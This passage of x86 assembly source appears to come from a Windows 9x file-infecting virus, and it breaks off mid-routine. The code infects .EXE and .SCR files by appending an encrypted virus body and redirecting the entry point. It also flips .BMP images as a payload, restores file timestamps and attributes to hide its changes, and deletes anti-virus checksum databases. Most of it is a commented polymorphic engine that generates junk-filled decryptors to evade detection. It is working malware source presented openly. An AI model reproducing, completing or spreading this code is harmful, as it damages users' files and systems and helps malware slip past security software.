                   call dword ptr [ebp+a_VxDCall]          ;VxDCall0

                   pop ebx

                   cmp eax,0FFFFFFFFh                      ;Success?
                   je close_file

                   mov dword ptr [ebp+bmp_address],eax     ;Save linnear address

                   push ebx

                   push PC_WRITEABLE or PC_USER
                   push 00000000h
                   push PD_ZEROINIT
                   push dword ptr [ebp+bmp_pages]          ;# of pages
                   shr eax,0Ch                             ;Linnear page number
                   push eax
                   push 00010001h                          ;Call to _PageCommit
                   call dword ptr [ebp+a_VxDCall]          ;VxDCall0

                   pop ebx

                   or eax,eax
                   je free_bmp_mem

                   call seek_bof                           ;Return to bof
                   jc close_file

                   mov eax,00003F00h                       ;Read the whole .BMP
                   mov ecx,dword ptr [ebp+msdos_header+00000002h]
                   mov edx,dword ptr [ebp+bmp_address]
                   call my_int21h
                   jc free_bmp_mem

                   mov eax,dword ptr [ebp+bmp_address]
                   mov esi,dword ptr [eax+0000000Ah]
                   add esi,eax

                   cmp dword ptr [esi],0DEADBABEh          ;Already flip'ed?
                   je free_bmp_mem

                   push esi

                   mov ecx,dword ptr [ebp+msdos_header+00000016h]

   height_loop:    push ecx
                   mov ecx,dword ptr [ebp+msdos_header+00000012h]
                   lea edi,dword ptr [esi+ecx-00000001h]
                   shr ecx,01h
                   push ecx

   width_loop:     mov al,byte ptr [esi]
                   mov ah,byte ptr [edi]
                   mov byte ptr [esi],ah
                   mov byte ptr [edi],al
                   inc esi
                   dec edi
                   loop width_loop

                   pop eax
                   add esi,eax
                   pop ecx
                   loop height_loop

                   pop esi
                   mov dword ptr [esi],0DEADBABEh

                   call seek_bof
                   jc free_bmp_mem

                   mov eax,00004000h
                   mov ecx,dword ptr [ebp+msdos_header+00000002h]
                   mov edx,dword ptr [ebp+bmp_address]
                   call my_int21h

   free_bmp_mem:   push ebx

                   xor eax,eax
                   push eax
                   push dword ptr [ebp+bmp_address]
                   push 0001000Ah                          ;Call to _PageFree
                   call dword ptr [ebp+a_VxDCall]          ;VxDCall0

                   pop ebx

                   jmp close_file

   executable:     cmp word ptr [ebp+msdos_header+MZ_lfarlc],0040h
                   jb close_file

                   call seek_eof                           ;Get file size
                   jc close_file

                   mov ecx,SIZE_PADDING                    ;Already infected?
                   xor edx,edx
                   div ecx
                   or edx,edx
                   jz close_file

                   call seek2pe_header                     ;Seek to PE header
                   jc close_file                           ;and read it
                   mov eax,00003F00h                       ;Read also following
                   mov ecx,IMAGE_SIZEOF_FILE_HEADER+ \     ;optional header
                           IMAGE_SIZEOF_NT_OPTIONAL_HEADER+ \
                           00000004h
                   lea edx,dword ptr [ebp+pe_signature]
                   call my_int21h
                   jc close_file
                   cmp dword ptr [ebp+pe_signature],IMAGE_NT_SIGNATURE
                   jne close_file
                   cmp word ptr [ebp+pe_header+FH_Machine], \
                           IMAGE_FILE_MACHINE_I386
                   jne close_file
                   mov ax,word ptr [ebp+pe_header+FH_Characteristics]
                   test ax,IMAGE_FILE_EXECUTABLE_IMAGE
                   jz close_file
                   test ax,IMAGE_FILE_DLL
                   jnz close_file

                   call seek2last_sh                       ;Seek to last section
                   jc close_file                           ;in file and read it
                   mov eax,00003F00h                       ;Avoid files with the
                   mov ecx,IMAGE_SIZEOF_SECTION_HEADER     ;IMAGE_SCN_MEM_SHARED
                   lea edx,dword ptr [ebp+section_header]  ;flag
                   call my_int21h
                   jc close_file
                   test dword ptr [ebp+section_header+SH_Characteristics], \
                                                     IMAGE_SCN_MEM_SHARED
                   jnz close_file

                   mov eax,dword ptr [ebp+optional_header+ \
                                 OH_AddressOfEntryPoint]   ;Save original
                   mov dword ptr [ebp+original_ep],eax     ;entry-point rva

                   call seek_eof                           ;Seek to EOF
                   jc close_file

                   push eax                                ;Save file size

                   add eax,inf_size                        ;Add virus size
                   add eax,dword ptr [ebp+decryptor_size]  ;Add decryptor size

                   mov esi,eax

                   mov ecx,SIZE_PADDING
                   xor edx,edx
                   div ecx
                   inc eax
                   mul ecx

                   sub eax,esi
                   mov dword ptr [ebp+padding_block],eax

                   add dword ptr [ebp+section_header+ \    ;New SizeOfRawData
                                  SH_SizeOfRawData],esi

                   add dword ptr [ebp+optional_header+ \
                                  OH_SizeOfImage],esi      ;New size of image

                   lea edx,dword ptr [esi+mem_size-inf_size]

                   add dword ptr [ebp+section_header+ \    ;New VirtualSize
                                  SH_VirtualSize],edx

                   or dword ptr [ebp+section_header+  \    ;Set section
                                 SH_Characteristics], \    ;characteristics
                                 IMAGE_SCN_MEM_READ   \
                                 or IMAGE_SCN_MEM_WRITE

                   pop eax                                 ;Get file size

                   add eax,dword ptr [ebp+section_header+SH_VirtualAddress]
                   sub eax,dword ptr [ebp+section_header+SH_PointerToRawData]
                   add eax,00000005h
                   mov dword ptr [ebp+infected_ep],eax     ;RVA of virus code

                   add eax,dword ptr [ebp+entry_point]     ;Entry to decryptor
                   add eax,inf_size-00000005h              ;Virus size
                   mov dword ptr [ebp+optional_header+ \
                           OH_AddressOfEntryPoint],eax     ;New entry-point

                   call scramble_virus                     ;Perform encryption

                   mov eax,00004000h                       ;Write virus body
                   mov ecx,inf_size                        ;at EOF
                   add ecx,dword ptr [ebp+decryptor_size]
                   add ecx,dword ptr [ebp+padding_block]
                   lea edx,dword ptr [ebp+mem_base+mem_size]

                   mov dword ptr [edx+ecx-00000004h],ecx   ;Save bytes written

                   call my_int21h
                   jc close_file

                   ;Get position of last section into file and write the
                   ;infected header data

                   call seek2last_sh
                   jc close_file

                   mov eax,00004000h                       ;Write section
                   mov ecx,IMAGE_SIZEOF_SECTION_HEADER     ;header
                   lea edx,dword ptr [ebp+section_header]
                   call my_int21h
                   jc close_file

                   ;Write PE header and part of Optional Header

                   call seek2pe_header
                   jc close_file

                   mov eax,00004000h                       ;Write headers
                   mov ecx,IMAGE_SIZEOF_FILE_HEADER+00000004h+0000005Eh
                   lea edx,dword ptr [ebp+pe_signature]
                   call my_int21h

   close_file:     mov eax,00003E00h                       ;Close file
                   call my_int21h

                   mov eax,00007143h                       ;LFN Ext attributes
                   mov bl,03h                              ;Set last write time
                   lea edx,dword ptr [ebp+target_filename] ;Ptr to filename
                   mov ecx,dword ptr [ebp+file_time]       ;Original time
                   mov edi,dword ptr [ebp+file_date]       ;Original date
                   call my_int21h

                   mov eax,00007143h                       ;LFN Ext attributes
                   xor ebx,ebx                             ;Set file attributes
                   inc ebx
                   mov ecx,dword ptr [ebp+file_attrib]     ;Original attributes
                   lea edx,dword ptr [ebp+target_filename] ;Ptr to filename
                   call my_int21h

                   lea esi,dword ptr [ebp+del_fileptr]     ;Delete AV checksum
                   mov ecx,00000004h                       ;databases

   delete_loop:    cld
                   lodsd
                   add eax,ebp
                   push ecx
                   push esi
                   mov esi,eax
                   mov edi,dword ptr [ebp+ptr_filename]

   insert_name:    lodsb
                   stosb
                   or al,al
                   jnz insert_name

                   mov eax,00007143h                       ;LFN Ext attributes
                   xor ebx,ebx                             ;Set file attributes
                   inc ebx
                   xor ecx,ecx                             ;Blow up attributes
                   lea edx,dword ptr [ebp+target_filename] ;Ptr to filename
                   call my_int21h

                   mov eax,00007141h                       ;Delete file
                   xor ecx,ecx
                   lea edx,dword ptr [ebp+target_filename]
                   xor esi,esi
                   call my_int21h

                   pop esi
                   pop ecx
                   loop delete_loop                        ;Delete next file

   exit_infection: mov dword ptr [ebp+hook_status],"FREE"  ;Clear busy flag
                   jmp exit_hook

   ;············································································
   ;Simulate a int 21h using VxDCall to VWIN32_int21h_dispatcher
   ;············································································

   my_int21h:      push ecx
                   push eax
                   push 002A0010h
                   call dword ptr [ebp+a_VxDCall]
                   ret

   ;············································································
   ;Move file pointer rotuines
   ;············································································

   seek_here:      ;Seek to edx

                   mov eax,edx
                   and eax,0FFFF0000h
                   shr eax,10h
                   mov ecx,eax
                   mov eax,00004200h
                   jmp short seek_now

   seek_bof:       ;Seek to begin of file

                   mov eax,00004200h
                   jmp short perform_seek

   seek_eof:       ;Seek to end of file

                   mov eax,00004202h
   perform_seek:   xor edx,edx
                   xor ecx,ecx
   seek_now:       call my_int21h
                   jc exit_seek
                   and eax,0000FFFFh
                   shl edx,10h
                   or eax,edx
                   xor edx,edx
                   clc
   exit_seek:      ret

   seek2pe_header: ;Seek to PE header

                   mov edx,dword ptr [ebp+msdos_header+MZ_lfanew]
                   call seek_here
                   ret

   seek2last_sh:   ;Seek to last section header

                   movzx ecx,word ptr [ebp+pe_header+FH_NumberOfSections]
                   dec ecx
                   mov eax,IMAGE_SIZEOF_SECTION_HEADER
                   mul ecx
                   mov edx,dword ptr [ebp+msdos_header+MZ_lfanew]
                   add edx,IMAGE_SIZEOF_FILE_HEADER+00000004h
                   movzx ecx,word ptr [ebp+pe_header+FH_SizeOfOptionalHeader]
                   add edx,ecx
                   add edx,eax
                   call seek_here
                   ret

   ;············································································
   ;Copy path+filename to our buffer in upper case and check extension
   ;············································································

   check_filename: push edi
                   mov edx,esi                             ;Now look at filename
                   lea edi,dword ptr [ebp+target_filename] ;while copying it
                   mov ecx,MAX_PATH                        ;into our buffer
                   cld
   look_name:      lodsb
                   cmp al,"a"
                   jb not_lowcase
                   cmp al,"z"
                   ja not_lowcase
                   sub al,"a"-"A"                          ;Convert to uppercase
   not_lowcase:    stosb
                   or al,al
                   je end_name
                   cmp al,"\"
                   jne look_loop
                   mov edx,edi
   look_loop:      loop look_name
   invalid_name:   pop edi
                   stc
                   ret
   end_name:       mov eax,dword ptr [edi-00000005h]
                   cmp eax,"EXE."                          ;Is a .EXE file?
                   je valid_file
                   cmp eax,"RCS."                          ;A screen saver?
                   je valid_file
                   cmp eax,"PMB."                          ;May be a .BMP file
                   je valid_file
                   cmp eax,"SYS."                          ;BMP hidden as .SYS?
                   jne invalid_name
   valid_file:     pop edi
                   clc
                   ret

   ;············································································
   ;
   ;Here comes the HPS polymorphic encryption engine, some of its features are:
   ;
   ; Size of operand modes: Byte, Word and Dword
   ;
   ; Decrypts in both directions, from lowest address to highest or starting
   ; at the end to the lowest address
   ;
   ; Indexing modes:
   ;
   ;       [reg]
   ;       [reg+imm]
   ;       [reg+reg]
   ;       [reg+reg+imm]
   ;
   ; Operations used to decrypt:
   ;
   ;       INC
   ;       DEC
   ;       NOT
   ;       ADD
   ;       SUB
   ;       XOR
   ;
   ; Garbage generators:
   ;
   ;       MOV reg,imm
   ;       MOV reg,reg
   ;       ADD reg,imm
   ;       ADC reg,imm
   ;       SUB reg,imm
   ;       SBB reg,imm
   ;       AND reg,imm
   ;       NOT reg,imm
   ;       XOR reg,imm
   ;       OR reg,imm
   ;       PUSH/Garbage/POP
   ;       CALL
   ;       JMP
   ;       Conditional jumps
   ;       MOVZX reg,reg
   ;       One byte instructions
   ;
   ; The engine uses a table to store the state of each register at any time
   ; while working
   ;
   ; The engine never generates each decryptor step in the same order, like
   ; this:
   ;
   ;       Load index register
   ;       Load counter register
   ;       Decrypt
   ;       Modify index register
   ;       Modify counter register
   ;
   ; This steps are generated inside subrotuines that can appear at any
   ; position in the decryptor code, like this:
   ;
   ;       Decrypt
   ;       Load counter register
   ;       Modify index register
   ;       Load index register
   ;       Modify counter register
   ;
   ; The garbage code generator can be called by itself in a recursive way,
   ; so it can generate complex sequences of nosense-looking code
   ;
   ; The resulting code is always hard to follow
   ;
   ;This kind of code is always hard to understand, i hope the comments are
   ;enough to guide you through this poly engine
   ;
   ;············································································
   ;Generate one decryptor
   ;············································································

   mutate:         ;Keep direction flag clear

                   pushad
                   cld

                   ;The engine uses a table that stores the state of each reg
                   ;Register table structure is as follows:
                   ;
                   ; 00h - Byte - Register mask
                   ; 01h - Byte - Register flags
                   ;
                   ;So now lets clear the state field before start generating
                   ;the polymorphic code

                   lea esi,dword ptr [ebp+tbl_startup]
                   lea edi,dword ptr [ebp+tbl_regs+REG_FLAGS]
                   mov ecx,00000007h
                   xor eax,eax
   loop_init_regs: lodsb
                   stosb
                   inc edi
                   loop loop_init_regs

                   ;Another table used by the engine holds the address of each
                   ;generator, the structure of this table is:
                   ;
                   ; 00h - DWORD - Address of generator
                   ; 04h - DWORD - Address of generated subroutine or
                   ;               00000000h if not yet generated
                   ;
                   ;Lets mark each entry as not yet generated

                   xor eax,eax
                   mov ecx,00000005h
                   lea edi,dword ptr [ebp+style_table+00000004h]
   clear_style:    stosd
                   add edi,00000004h
                   loop clear_style

                   ;Clear displacement over displacement field

                   mov dword ptr [ebp+disp2disp],ecx

                   ;Now choose the register that the engine will use as
                   ;index register

                   call get_valid_reg
                   mov al,byte ptr [ebx+REG_MASK]
                   mov byte ptr [ebp+index_mask],al
                   or byte ptr [ebx+REG_FLAGS],REG_IS_INDEX

                   ;Choose also wich register will be used as counter

                   call get_valid_reg
                   mov al,byte ptr [ebx+REG_MASK]
                   mov byte ptr [ebp+counter_mask],al
                   or byte ptr [ebx+REG_FLAGS],REG_IS_COUNTER

                   ;The engine generates the following indexing modes:
                   ;
                   ; DECRYPT [reg]
                   ; DECRYPT [reg+imm]
                   ; DECRYPT [reg+reg]
                   ; DECRYPT [reg+reg+imm]
                   ;
                   ;This code determines if we are going to use any displacement
                   ;and if so, it gets a random one

                   call get_rnd32
                   and eax,00000001h
                   jz ok_disp
                   call get_rnd32
                   and eax,000FFFFFh
   ok_disp:        mov dword ptr [ebp+ptr_disp],eax

                   ;Dercrypt instructions such as ADD, SUB or XOR need a
                   ;key to use as second operand, choose it here

                   call get_rnd32
                   mov dword ptr [ebp+crypt_key],eax

                   ;This field holds some flags:
                   ;
                   ; CRYPT_DIRECTION Decrypt up->down or up<-down
                   ; CRYPT_CMPCTR
                   ; CRYPT_CDIR
                   ; CRYPT_SIMPLEX
                   ; CRYPT_COMPLEX

                   call get_rnd32
                   mov byte ptr [ebp+build_flags],al

                   ;The counter register needs to be loaded with the size
                   ;of the encrypted code divided by the size of the
                   ;decrypt instruction (01h for byte, 02h for word or
                   ;04h for double word)
                   ;This routine determines this size

                   call get_rnd32
                   and al,03h
                   cmp al,01h
                   je get_size_ok
                   cmp al,02h
                   je get_size_ok
                   inc al
   get_size_ok:    mov byte ptr [ebp+oper_size],al

                   ;At any time EDI points to the place where the engine have
                   ;to generate the next decryptor instruction

                   mov edi,dword ptr [ebp+mem_address]
                   add edi,mem_size+inf_size
                   push edi

                   ;Put some random data at the begining, this will never
                   ;be executed so note that it is "random data" and not
                   ;"random code"
                   ;Keep in mind this diference in next comments

                   call gen_rnd_block

                   ;Generated decryptors are just polymorphic versions of the
                   ;following pseudocode:
                   ;
                   ; Generate decryptor steps, each step into a different
                   ; subroutine and in random order each time
                   ;
                   ; Generate calls to each subrotuine trying to hide this
                   ; calls inside lots of random code
                   ;
                   ;As result generated code will never repeat any sequence
                   ;of actions, for example: The routine that loads the index
                   ;register can be generated at the begining of the decryptor
                   ;or at the end, but it will be called always in the first
                   ;call instruction
                   ;
                   ;Steps into first pseudocode are:
                   ;
                   ; Generate code that loads the index register
                   ; Generate code that loads the counter register
                   ; Generate decryp instruction
                   ; Increment/Decrement index register in its proper size
                   ; Increment/Decrement counter register
                   ;
                   ;Now start generating one subroutine for each of the above
                   ;steps

                   mov ecx,00000005h

   do_subroutine:  push ecx

                   ;Get a random entry in the steps table, remember that each
                   ;entry have the following structure:
                   ;
                   ; 00h - DWORD - Address of generator
                   ; 04h - DWORD - Address of generated subroutine or
                   ;               00000000h if not yet generated

   routine_done:   mov eax,00000005h
                   call get_rnd_range
                   lea esi,dword ptr [ebp+style_table+eax*08h]

                   ;Already generated?

                   xor edx,edx
                   cmp dword ptr [esi+00000004h],edx
                   jne routine_done

                   ;Generate subrotuine inside some random code, so pseudocode
                   ;for each one will look like this:
                   ;
                   ; Random code
                   ; Decryptor step (load index, load counter, decrypt ...)
                   ; Random code
                   ; RET
                   ; Random data
                   ;
                   ;Note that "random code" will also contain calls, jumps and
                   ;lots of no-sense shit that will really hide the code of the
                   ;decryptor step
                   ;The "random data" will let some space betwen each subrotuine
                   ;(size and data are random)
                   ;This code will also save the entry-point of each generated
                   ;subroutine, so we can call them later

                   push edi
                   call gen_garbage
                   lodsd
                   pop dword ptr [esi]
                   add eax,ebp
                   call eax
                   call gen_garbage
                   mov al,0C3h
                   stosb
                   call gen_rnd_block

                   ;Generate next subroutine

                   pop ecx
                   loop do_subroutine

                   ;Well, i said that generated decryptors are just polymorphic
                   ;versions of the following pseudocode
                   ;
                   ; Generate decryptor steps, each step into a different
                   ; subroutine and in random order each time
                   ;
                   ; Generate calls to each subrotuine trying to hide this
                   ; calls inside lots of random code
                   ;
                   ;Its time to work on the second step

                   ;This is the entry-point to the polymorphic decryptor,
                   ;save it, we will point the file entry-point here later on

                   mov dword ptr [ebp+entry_point],edi
                   call gen_garbage

                   ;The entry-point of each generated subroutine have been
                   ;stored into the steps table
                   ;Generate a CALL instruction for each table entry, but
                   ;hide the it inside some random code, like this:
                   ;
                   ; Random code
                   ; CALL instruction to the decryptor step subroutine
                   ; Random code
                   ;
                   ;As i already said "random code" may contain another CALLs
                   ;and JMPs

                   lea esi,dword ptr [ebp+style_table+00000004h]
                   mov ecx,00000005h

   do_call:        push ecx
                   cmp ecx,00000003h
                   jne is_not_loop

                   ;At this time the CALLs that loads the index and counter
                   ;registers have been generated
                   ;We need to save current position into decryptor code
                   ;in order to jump here on each decryptor iteration
                   ;I think is not a bad idea to also hide this point inside
                   ;blocks of random code

                   call gen_garbage
                   mov dword ptr [ebp+loop_point],edi

   is_not_loop:    call gen_garbage
                   mov al,0E8h
                   stosb
                   lodsd
                   sub eax,edi
                   sub eax,00000004h
                   stosd
                   call gen_garbage
                   lodsd
                   pop ecx
                   loop do_call

                   ;The hard work is done, now generate the end condition
                   ;and jumps

                   call gen_garbage
                   call gen_loop
                   call gen_garbage

                   ;Some garbage

                   call gen_rnd_block
                   push edi
                   mov ecx,SIZE_PADDING
                   call rnd_fill
                   pop edi

                   ;Decryptor done, save its size

                   pop eax
                   sub dword ptr [ebp+entry_point],eax
                   sub edi,eax
                   mov dword ptr [ebp+decryptor_size],edi

                   ;Copy virus body to our buffer

                   lea esi,dword ptr [ebp+mem_base]
                   mov edi,dword ptr [ebp+mem_address]
                   mov ecx,mem_size
                   rep movsb

                   popad
                   ret

   ;············································································
   ;Aply encryption over virus copy
   ;············································································

   scramble_virus: lea esi,dword ptr [ebp+mem_base]
                   lea edi,dword ptr [esi+mem_size]
                   push edi
                   mov ecx,inf_size
                   cld
                   rep movsb
                   call fixed_size2ecx
                   pop edi
   loop_hide_code: push ecx
                   mov eax,dword ptr [edi]
                   call perform_crypt
                   xor ecx,ecx
                   mov cl,byte ptr [ebp+oper_size]
   loop_copy_res:  stosb
                   shr eax,08h
                   loop loop_copy_res
                   pop ecx
                   loop loop_hide_code
                   ret

   ;············································································
   ;Perform encryption
   ;············································································

   perform_crypt:  ;This buffer will contain the code to "crypt" the virus code
                   ;followed by a RET instruction

                   db 10h dup (90h)

   ;············································································
   ;Generate decryptor action: Get delta offset
   ;············································································

   gen_get_delta:  ;Lets generate polymorphic code for the following pseudocode:
                   ;
                   ; CALL get_delta
                   ; Random data
                   ; get_delta:
                   ; Random code
                   ; POP reg
                   ;
                   ;Here come the CALL opcode

                   mov al,0E8h
                   stosb

                   ;Let space for the address to call

                   stosd
                   mov dword ptr [ebp+delta_call],edi
                   push edi

                   ;Generate some random data

                   call gen_rnd_block

                   ;Get displacement from CALL instruction to destination
                   ;address

                   mov eax,edi
                   pop esi
                   sub eax,esi

                   ;Put destination address after CALL opcode

                   mov dword ptr [esi-00000004h],eax

                   ;This code will be generated where the CALL points to
                   ;
                   ; Random code
                   ; POP index register
                   ; Random code
                   ; Fix index register value
                   ;
                   ;Note that "random code" can contain some PUSH and POP
                   ;instruction, so there is no equivalence betwen the
                   ;first POP after the CALL and the register used as index

                   call gen_garbage
                   mov al,58h
                   or al,byte ptr [ebp+index_mask]
                   stosb
                   call gen_garbage

                   ;Make needed fixes to point index to start or end of
                   ;encrypted code

                   mov eax,dword ptr [ebp+mem_address]
                   add eax,mem_size
                   add eax,dword ptr [ebp+ptr_disp]
                   sub eax,dword ptr [ebp+delta_call]
                   test byte ptr [ebp+build_flags],CRYPT_DIRECTION
                   jz fix_dir_ok

                   ;Direction is from top to bottom

                   push eax
                   call fixed_size2ecx
                   xor eax,eax
                   mov al,byte ptr [ebp+oper_size]
                   push eax
                   mul ecx
                   pop ecx
                   sub eax,ecx
                   pop ecx
                   add eax,ecx
   fix_dir_ok:     push eax

                   ;Fix using ADD or SUB?

                   call get_rnd32
                   and al,01h
                   jz fix_with_sub

   fix_with_add:   ;Generate ADD reg_index,fix_value

                   mov ax,0C081h
                   or ah,byte ptr [ebp+index_mask]
                   stosw
                   pop eax
                   jmp short fix_done

   fix_with_sub:   ;Generate SUB reg_index,-fix_value

                   mov ax,0E881h
                   or ah,byte ptr [ebp+index_mask]
                   stosw
                   pop eax
                   neg eax

   fix_done:       stosd
                   ret

   ;············································································
   ;Generate decryptor action: Load counter
   ;············································································

   gen_load_ctr:   ;Easy now, just move counter random initial value
                   ;into counter reg and calculate the end value

                   mov al,0B8h
                   or al,byte ptr [ebp+counter_mask]
                   stosb
                   call fixed_size2ecx
                   call get_rnd32
                   stosd
                   test byte ptr [ebp+build_flags],CRYPT_CDIR
                   jnz counter_down
   counter_up:     add eax,ecx
                   jmp short done_ctr_dir
   counter_down:   sub eax,ecx
   done_ctr_dir:   mov dword ptr [ebp+end_value],eax
                   ret

   ;············································································
   ;Generate decryptor action: Decrypt
   ;············································································

   gen_decrypt:    ;Check if we are going to use a displacement in the
                   ;indexing mode

                   mov eax,dword ptr [ebp+ptr_disp]
                   or eax,eax
                   jnz more_complex

                   ;Choose generator for [reg] indexing mode

                   mov edx,offset tbl_idx_reg
                   call choose_magic
                   jmp you_got_it

   more_complex:   ;More fun?!?!

                   mov al,byte ptr [ebp+build_flags]
                   test al,CRYPT_SIMPLEX
                   jnz crypt_xtended

                   ;Choose generator for [reg+imm] indexing mode

                   mov edx,offset tbl_dis_reg
                   call choose_magic

   you_got_it:     ;Use magic to convert some values into
                   ;desired instructions

                   call size_correct
                   mov dl,byte ptr [ebp+index_mask]
                   lodsb
                   or al,al
                   jnz adn_reg_01
                   cmp dl,00000101b
                   je adn_reg_02
   adn_reg_01:     lodsb
                   or al,dl
                   stosb
                   jmp common_part
   adn_reg_02:     lodsb
                   add al,45h
                   xor ah,ah
                   stosw
                   jmp common_part

   crypt_xtended:  ;Choose [reg+reg] or [reg+reg+disp]

                   test al,CRYPT_COMPLEX
                   jz ok_complex

                   ;Get random displacement from current displacement
                   ;eeehh?!?

                   mov eax,00000010h
                   call get_rnd_range
                   mov dword ptr [ebp+disp2disp],eax
                   call load_aux
                   push ebx
                   call gen_garbage

                   ;Choose generator for [reg+reg+imm] indexing mode

                   mov edx,offset tbl_paranoia
                   call choose_magic
                   jmp short done_xtended

   ok_complex:     mov eax,dword ptr [ebp+ptr_disp]
                   call load_aux
                   push ebx
                   call gen_garbage

                   ;Choose generator for [reg+reg] indexing mode

                   mov edx,offset tbl_xtended
                   call choose_magic

   done_xtended:   ;Build decryptor instructions

                   call size_correct
                   pop ebx
                   mov dl,byte ptr [ebp+index_mask]
                   lodsb
                   mov cl,al
                   or al,al
                   jnz arn_reg_01
                   cmp dl,00000101b
                   jne arn_reg_01
                   lodsb
                   add al,40h
                   stosb
                   jmp short arn_reg_02
   arn_reg_01:     movsb
   arn_reg_02:     mov al,byte ptr [ebx+REG_MASK]
                   shl al,03h
                   or al,dl
                   stosb
                   or cl,cl
                   jnz arn_reg_03
                   cmp dl,00000101b
                   jne arn_reg_03
                   xor al,al
                   stosb

   arn_reg_03:     ;Restore aux reg state

                   xor byte ptr [ebx+REG_FLAGS],REG_READ_ONLY

   common_part:    ;Get post-build flags

                   lodsb

                   ;Insert displacement from real address?

                   test al,MAGIC_PUTDISP
                   jz skip_disp
                   push eax
                   mov eax,dword ptr [ebp+ptr_disp]
                   sub eax,dword ptr [ebp+disp2disp]
                   neg eax
                   stosd
                   pop eax

   skip_disp:      ;Insert key?

                   test al,MAGIC_PUTKEY
                   jz skip_key
                   call copy_key

   skip_key:       ;Generate reverse code

                   call do_reverse

                   ret

   ;············································································
   ;Choose a magic generator
   ;············································································

   choose_magic:   mov eax,00000006h
                   call get_rnd_range
                   add edx,ebp
                   lea esi,dword ptr [edx+eax*04h]
                   lodsd
                   add eax,ebp
                   mov esi,eax
                   ret

   ;············································································
   ;Do operand size correction
   ;············································································

   size_correct:   lodsb
                   mov ah,byte ptr [ebp+oper_size]
                   cmp ah,01h
                   je store_correct
                   inc al
                   cmp ah,04h
                   je store_correct
                   mov ah,66h
                   xchg ah,al
                   stosw
                   ret
   store_correct:  stosb
                   ret

   ;············································································
   ;Load aux reg with displacement
   ;············································································

   load_aux:       ;Get a valid auxiliary register

                   push eax
                   call get_valid_reg
                   or byte ptr [ebx+REG_FLAGS],REG_READ_ONLY

                   ;Move displacement into aux reg

                   mov al,0B8h
                   or al,byte ptr [ebx+REG_MASK]
                   stosb
                   pop eax
                   neg eax
                   stosd
                   ret

   ;············································································
   ;Generate crypt-code
   ;············································································

   do_reverse:     xor eax,eax
                   mov al,byte ptr [ebp+oper_size]
                   shr eax,01h
                   shl eax,02h
                   add esi,eax
                   lodsd
                   add eax,ebp
                   mov esi,eax
                   push edi
                   lea edi,dword ptr [ebp+perform_crypt]
   loop_string:    lodsb
                   cmp al,MAGIC_ENDSTR
                   je end_of_magic
                   cmp al,MAGIC_ENDKEY
                   je last_spell
                   xor ecx,ecx
                   mov cl,al
                   rep movsb
                   jmp short loop_string
   last_spell:     call copy_key
   end_of_magic:   mov al,0C3h
                   stosb
                   pop edi
                   ret

   ;············································································
   ;Copy encryption key into work buffer taking care about operand size
   ;············································································

   copy_key:       mov eax,dword ptr [ebp+crypt_key]
                   xor ecx,ecx
                   mov cl,byte ptr [ebp+oper_size]
   loop_key:       stosb
                   shr eax,08h
                   loop loop_key
                   ret

   ;············································································
   ;Generate decryptor action: Move index to next step
   ;············································································

   gen_next_step:  ;Get number of bytes to inc or dec the index reg

                   xor ecx,ecx
                   mov cl,byte ptr [ebp+oper_size]

   loop_update:    ;Get number of bytes to update with this instruction

                   mov eax,ecx
                   call get_rnd_range
                   inc eax

                   ;Check direction

                   test byte ptr [ebp+build_flags],CRYPT_DIRECTION
                   jnz step_down

                   call do_step_up
                   jmp short next_update

   step_down:      call do_step_down

   next_update:    sub ecx,eax
                   jecxz end_update
                   jmp short loop_update
   end_update:     ret

   do_step_up:     ;Move index_reg up

                   or eax,eax
                   jz up_with_inc

                   ;Now choose ADD or SUB

                   push eax
                   call get_rnd32
                   and al,01h
                   jnz try_sub_1

   try_add_1:      mov ax,0C081h
                   or ah,byte ptr [ebp+index_mask]
                   stosw
                   pop eax
                   stosd
                   ret

   try_sub_1:      mov ax,0E881h
                   or ah,byte ptr [ebp+index_mask]
                   stosw
                   pop eax
                   neg eax
                   stosd
                   neg eax
                   ret

   up_with_inc:    ;Generate INC reg_index

                   mov al,40h
                   or al,byte ptr [ebp+index_mask]
                   stosb
                   mov eax,00000001h
                   ret

   do_step_down:   ;Move index_reg down

                   or eax,eax
                   jz down_with_dec

                   ;Now choose ADD or SUB

                   push eax
                   call get_rnd32
                   and al,01h
                   jnz try_sub_2

   try_add_2:      mov ax,0C081h
                   or ah,byte ptr [ebp+index_mask]
                   stosw
                   pop eax
                   neg eax
                   stosd
                   neg eax
                   ret

   try_sub_2:      mov ax,0E881h
                   or ah,byte ptr [ebp+index_mask]
                   stosw
                   pop eax
                   stosd
                   ret

   down_with_dec:  ;Generate DEC reg_index

                   mov al,48h
                   or al,byte ptr [ebp+index_mask]
                   stosb
                   mov eax,00000001h
                   ret

   ;············································································
   ;Generate decryptor action: Next counter value
   ;············································································

   gen_next_ctr:   ;Check counter direction and update counter
                   ;using a INC or DEC instruction

                   test byte ptr [ebp+build_flags],CRYPT_CDIR
                   jnz upd_ctr_down
   upd_ctr_up:     mov al,40h
                   or al,byte ptr [ebp+counter_mask]
                   jmp short upd_ctr_ok
   upd_ctr_down:   mov al,48h
                   or al,byte ptr [ebp+counter_mask]
   upd_ctr_ok:     stosb
                   ret

   ;············································································
   ;Generate decryptor action: Loop
   ;············································································

   gen_loop:       ;Use counter reg in CMP instruction?

                   test byte ptr [ebp+build_flags],CRYPT_CMPCTR
                   jnz doloopauxreg

                   ;Generate CMP counter_reg,end_value

                   mov ax,0F881h
                   or ah,byte ptr [ebp+counter_mask]
                   stosw
                   mov eax,dword ptr [ebp+end_value]
                   stosd

                   jmp doloopready

   doloopauxreg:   ;Get a random valid register to use in a CMP instruction

                   call get_valid_reg
                   or byte ptr [ebx+REG_FLAGS],REG_READ_ONLY

                   ;Move index reg value into aux reg

                   mov ah,byte ptr [ebx+REG_MASK]
                   shl ah,03h
                   or ah,byte ptr [ebp+counter_mask]
                   or ah,0C0h
                   mov al,8Bh
                   stosw

                   ;Guess what!?

                   push ebx
                   call gen_garbage
                   pop ebx

                   ;Generate CMP aux_reg,end_value

                   mov ax,0F881h
                   or ah,byte ptr [ebx+REG_MASK]
                   stosw
                   mov eax,dword ptr [ebp+end_value]
                   stosd

                   ;Restore aux reg state

                   xor byte ptr [ebx+REG_FLAGS],REG_READ_ONLY

   doloopready:    ;Generate conditional jump

                   call get_rnd32
                   and al,01h
                   jnz doloopdown

   doloopup:       ;Generate the following structure:
                   ;
                   ;       loop_point:
                   ;       ...
                   ;       cmp reg,x
                   ;       jne loop_point
                   ;       ...
                   ;       jmp virus
                   ;       ...

                   mov ax,850Fh
                   stosw
                   mov eax,dword ptr [ebp+loop_point]
                   sub eax,edi
                   sub eax,00000004h
                   stosd

                   call gen_garbage

                   ;Insert a jump to virus code

                   mov al,0E9h
                   stosb
